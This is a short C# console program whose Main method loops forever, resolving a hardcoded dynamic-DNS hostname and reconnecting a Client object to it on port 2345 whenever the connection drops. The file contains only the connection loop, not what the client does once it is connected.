namespace ConsoleClient
{
    using System;
    using System.Net;
    using System.Threading;

    public static class Program
    {
        private const string SERVER_HOST = "marry.noip.me";
        private const int SERVER_PORT = 2345;
        private const int RECONNECT_TIMEOUT_MS = 1000;

        static void Main(string[] args)
        {
            Client client = new Client();
            while (true)
            {
                if (!client.IsConnected)
                {
                    IPAddress ipAdress = null;

                    try
                    {
                        IPAddress[] ipAddresses = Dns.GetHostAddresses(SERVER_HOST);
                        if (ipAddresses.Length > 0)
                        {
                            ipAdress = ipAddresses[0];
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                    if (ipAdress != null)
                    {
                        client.Start(ipAdress, SERVER_PORT);
                    }

                    Thread.Sleep(RECONNECT_TIMEOUT_MS);
                }
            }
        }

    }
}
